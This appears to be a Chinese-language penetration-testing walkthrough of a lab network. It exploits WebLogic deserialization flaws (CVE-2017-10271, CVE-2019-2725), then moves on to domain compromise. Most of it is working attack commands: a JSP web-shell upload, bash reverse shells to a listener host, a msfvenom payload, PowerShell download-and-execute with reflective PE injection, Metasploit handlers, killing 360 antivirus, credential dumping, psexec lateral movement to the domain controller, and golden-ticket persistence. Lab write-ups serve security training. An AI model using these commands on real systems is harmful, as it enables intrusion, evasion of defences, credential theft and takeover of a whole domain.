    wget http://192.168.111.1/wanan.txt -O servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/wan.jsp
蚁剑连接一下
反弹shell
    bash -i >& /dev/tcp/target ip/target port 0>&1
    这里>&需要转换，否则无法利用
    例：
    bash -i >& /dev/tcp/192.168.111.128/7777 0>&1
### weblogic CVE-2017-10271
要跟上一个环境分开的话就重启一下
    reboot
    cd /root/vulnhub/weblogic/CVE-2017-10271/
    vim docker-compose.yml
    cd /root/Oracle/Middleware/user_projects/domains/base_domain/bin
    vi setDomainEnv.sh
    debugFlag="true"
    export debugFlag
    DEBUG_PORT=8888
    docker cp 51bde427044b:/root ./weblogic_jars
    mkdir weblogic_jars/10271
    find ./weblogic_jars -name *.jar -exec cp {} ./weblogic_jars/10271/ \;
打开wlserver_10.3
打个断点
    http://192.168.111.129:7001/wls-wsat/CoordinatorPortType
访问这个路径 显示以下页面可能存在漏洞
下面的也可以尝试
    /wls-wsat/CoordinatorPortType
    /wls-wsat/RegistrationPortTypeRPC
    /wls-wsat/ParticipantPortType
    /wls-wsat/RegistrationRequesterPortType
    /wls-wsat/CoordinatorPortType11
    /wls-wsat/RegistrationPortTypeRPC11
    /wls-wsat/ParticipantPortType11
    /wls-wsat/RegistrationRequesterPortType11
    POST /wls-wsat/CoordinatorPortType HTTP/1.1
    Host: 192.168.111.129:7001
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Connection: close
    Upgrade-Insecure-Requests: 1
    Cache-Control: max-age=0
    Content-Type: text/xml
    Content-Length: 641
    /bin/bash
    -c
    bash -i >& /dev/tcp/192.168.111.128/7777 0>&1
VE-2017-10271漏洞主要是由WebLogic Server WLS组件远程命令执行漏洞，主要由wls-wsat.war触发该漏洞，触发漏洞url如下： 
post数据包，通过构造构造SOAP（XML）格式的请求，在解析的过程中导致XMLDecoder反序列化漏洞。
在weblogic/wsee/jaxws/workcontext/WorkContextServerTube类的processRequest方法中，处理POST数据包中的XML数据。var1即是传入的xml数据
到readHeaderOld方法中，处理读取的xml
前面获取了xml，使用ByteArrayOutputStream转换成了字节流赋值给var4，然后调用了WorkContextXmlInputAdapter传入了var4
继续跟进几个方法后，到了WorkContextLocalMap#receiveRequest，165行调用了WorkContextEntryImpl的readEntry方法
跟进readUTF，在这里进行了xmlDecoder.readObject触发了xmlDecoder的反序列化，执行了ProcessBuilder.start()
### 利用CVE-2019-2725写shell
把shell写到images目录中
    \Oracle\Middleware\wlserver_10.3\server\lib\consoleapp\webapp\framework\skins\wlsconsole\images\wan.jsp
    http://192.168.111.80:7001/console/framework/skins/wlsconsole/images/wan.jsp
## 内网
下载PowerSploit
    git clone https://github.com/PowerShellMafia/PowerSploit.git
生成木马
    msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe lhost=192.168.111.80 lport=4444 -o ./shell.exe
转换成base64
    cat shell.exe | base64 >base64.txt
开启监听
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    set lhost 192.168.111.128
    set lport 4444
    run
python起一个网络服务
    python3 -m http.server
远程加载powershell的pe反射模块
    iex(New-Object Net.WebClient).DownloadString("http://192.168.111.128:8000/PowerSploit/CodeExecution/Invoke-ReflectivePEInjection.ps1")
继续加载base64编码后的payload，赋值给一个变量
    $b64Str = (New-Object Net.WebClient).DownloadString("http://192.168.111.128:8000/base64.txt")
靶机解码payload
    $PEBytes = [System.Convert]::FromBase64String($b64Str)
反射调用
    Invoke-ReflectivePEInjection -PEBytes $PEBytes -ForceASLR
把上面的写成脚本 wan.ps1
    iex(New-Object Net.WebClient).DownloadString("http://192.168.111.128:8000/PowerSploit/CodeExecution/Invoke-ReflectivePEInjection.ps1");  $b64Str = (New-Object Net.WebClient).DownloadString("http://192.168.111.128:8000/base64.txt") ;  $PEBytes = [System.Convert]::FromBase64String($b64Str) ;  Invoke-ReflectivePEInjection -PEBytes $PEBytes -ForceASLR
    powershell -ExecutionPolicy Bypass -File C:/Windows/wan.ps1
弹不上来 但是本地尝试可以
换种方法
    use exploit/multi/handler
    set payload java/jsp_shell_reverse_tcp
    set lhost 192.168.111.128
    set lport 5555
    run
输出的东西都一样还是弹不上来
在换一种方式
    use exploit/multi/misc/weblogic_deserialize_asyncresponseservice
    set payload  windows/x64/meterpreter/reverse_tcp 
    set LHOST 192.168.111.128
    set rhosts 192.168.111.80
    set target Windows
    run
迁移进程
    ps -ef | grep svchost.exe
    migrate 632
成功获取到system权限
查看杀软
尝试杀一下
    ps | grep 360
虽然杀了但是又重启了
我们尝试出入360的主动防御
我还没杀就自己没了?
我们在把主动防御杀了.先迁移回去
可以看到360确实被我们干死了
派生给cs
    use windows/local/payload_inject
    set disablepayloadhandler true
    set payload windows/meterpreter/reverse_http
    set lhost 192.168.111.129 #teamserver 地址
    set lport 5555  #非会话监听地址
    set session 3 #会话session id
    exploit
看一下上面一样就好
成功接收到会话
抓密码
收集一下信息 在一里面命令挺全的了,这里就拿重要的来了
    shell ipconfig/all
双网卡
域下信息收集不到的话,就去全部换原一下快照
    net view
    shell net user /domain
    shell net group "domain controllers" /domain
    查看域控制器
    shell net group "domain computers" /domain
    查看当前域成员计算机列表
psexec 是微软 pstools 工具包中最常用的一个工具，也是在内网渗透中的免杀渗透利器。psexec 能够在命令行下在对方没有开启 telnet
服务的时候返回一个半交互的命令行，像 telnet 客户端一样。原理是基于IPC共享，所以要目标打开 445 端口。另外在启动这个 psexec
建立连接之后对方机器上会被安装一个服务。
利用 psexec 横向移动至DC，域控成功上线。
成功上线
## 权限维持
在域控获得KRBTGT账户NTLM密码哈希和SID
    hashdump
    logonpasswords
### 黄金票据利用
黄金票据是伪造票据授予票据(TGT),也被称为认证票据,TGT仅用于向域服务器上的密钥分配中心(KDC)证明用户已经被其他的域控制器认证
黄金票据的条件
  1. 域名城
  2. 域的sid值
  3. 域的krbtgt账户htlm密码哈希
  4. 伪造用户名
黄金票据可以在拥有普通域用户权限和krbtgt账户的hash的情况下用来获取域管理员权限,上面已经获取了域控的system权限了,还可以使用黄金票据做权限维持,当域控制器权限掉了之后,在通过域内其他任意机器伪造票据重新湖区最高权限